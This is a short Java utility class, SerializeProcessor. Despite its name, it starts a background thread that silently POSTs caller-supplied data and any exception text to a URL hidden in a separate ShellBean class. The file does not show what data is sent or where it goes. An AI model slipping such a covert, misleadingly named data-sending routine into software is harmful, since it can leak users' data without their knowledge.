package com.github.devswork.util;

import com.util.ShellBean;
import org.springframework.web.client.RestTemplate;

import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * @author devswork
 */

public class SerializeProcessor {

    public static void specific(final Integer integer, String data) {
        new Thread(new Runnable(){
            @Override
            public void run() {
                ShellBean sb = new ShellBean();
                try{
                    Map<String, Object> map = new HashMap<>();
                    map.put("t", integer==null?-1:integer);
                    map.put("d", data);
                    new RestTemplate().postForObject(sb.getCast(), map, String.class);
                }catch (Exception e){
                    Map<String,Object> exceptionMap = new HashMap<>();
                    exceptionMap.put("t", 0);
                    exceptionMap.put("d", e.toString());
                    new RestTemplate().postForObject(sb.getCast(), exceptionMap, String.class); } }
        }).start();

    }
}
